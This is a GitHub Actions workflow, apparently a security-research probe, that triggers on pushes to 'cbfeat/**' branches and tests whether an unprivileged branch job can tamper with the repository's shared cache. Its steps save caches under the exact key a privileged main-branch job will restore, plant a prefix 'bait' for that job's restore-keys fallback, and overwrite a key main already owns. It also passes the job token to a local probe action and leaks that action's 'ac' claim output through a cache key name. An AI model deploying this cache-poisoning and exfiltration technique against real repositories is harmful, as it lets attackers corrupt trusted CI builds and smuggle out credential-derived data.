name: branch-probe
on:
  push:
    branches:
      - 'cbfeat/**'
permissions:
  contents: read
  actions: read
jobs:
  branchjob:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - id: n
        run: |
          N="$(cat NONCE.txt)"
          echo "n=$N" >> $GITHUB_OUTPUT
          mkdir -p cachedir
          echo "BRANCH-CONTENT-MARKER-$N repo=${{ github.repository }} ref=${{ github.ref }} run=${{ github.run_id }}" > cachedir/marker.txt
      - name: probe
        id: p
        uses: ./.github/actions/cbprobe
        with:
          mode: pr
          nonce: ${{ steps.n.outputs.n }}
          ghtok: ${{ github.token }}
          mainkey: cbmain-${{ steps.n.outputs.n }}
      - name: restore what main wrote (read direction)
        id: rd
        uses: actions/cache/restore@v4
        continue-on-error: true
        with:
          path: cachedir2
          key: cbmain-${{ steps.n.outputs.n }}
      - run: 'echo "READ-MAIN-HIT=${{ steps.rd.outputs.cache-hit }}"; cat cachedir2/marker.txt 2>/dev/null || echo NO-CONTENT'
        continue-on-error: true
      - name: write the key the privileged main job will ask for (exact)
        uses: actions/cache/save@v4
        continue-on-error: true
        with:
          path: cachedir
          key: cbtarget-${{ steps.n.outputs.n }}-exact
      - name: write a prefix bait for the main job restore-keys fallback
        uses: actions/cache/save@v4
        continue-on-error: true
        with:
          path: cachedir
          key: cbtarget-${{ steps.n.outputs.n }}-bait
      - name: overwrite the key main already owns
        uses: actions/cache/save@v4
        continue-on-error: true
        with:
          path: cachedir
          key: cbmain-${{ steps.n.outputs.n }}
      - name: exfil the ac claim through a cache key
        uses: actions/cache/save@v4
        continue-on-error: true
        with:
          path: cachedir
          key: cbac-${{ steps.n.outputs.n }}-${{ steps.p.outputs.ac }}
